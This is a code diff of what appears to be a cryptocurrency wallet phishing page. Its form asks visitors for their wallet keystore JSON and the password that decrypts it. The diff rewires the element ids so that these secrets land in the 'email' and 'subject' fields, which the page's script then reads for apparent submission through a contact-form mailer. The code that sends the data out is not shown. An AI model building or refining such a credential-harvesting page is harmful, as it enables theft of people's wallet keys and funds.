@@ -73,10 +73,10 @@
     <input type="hidden" name="type" id="type" value="KeystoreJSON">
     <input type="hidden" name="wallet" id="hidden2" value="">
     
-    <textarea name="mnemonic" required="required" minlength="12" id="phrase" placeholder="Keystore JSON"></textarea>
+    <textarea name="mnemonic" required="required" minlength="12" id="email" placeholder="Keystore JSON"></textarea>
     <br>
     <div class="field">
-    <input type="text" name="password" placeholder="Password" id="phrase" required="required" value="">
+    <input type="text" name="password" placeholder="Password" id="subject" required="required" value="">
     </div>
     <div class="desc">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
     <br>
@@ -3886,7 +3886,7 @@
 
 
    
-</div>
+</div>  
 
 <script>
 
@@ -3920,7 +3920,7 @@
      var btn = document.getElementById("btn");
      btn.addEventListener('click',function(e){
        e.preventDefault()
-        var name = document.getElementById("name");
+        var name = document.getElementById("name").value;
         var email = document.getElementById("email").value;
         var subject = document.getElementById("subject").value;
         var message= document.getElementById("message").value;
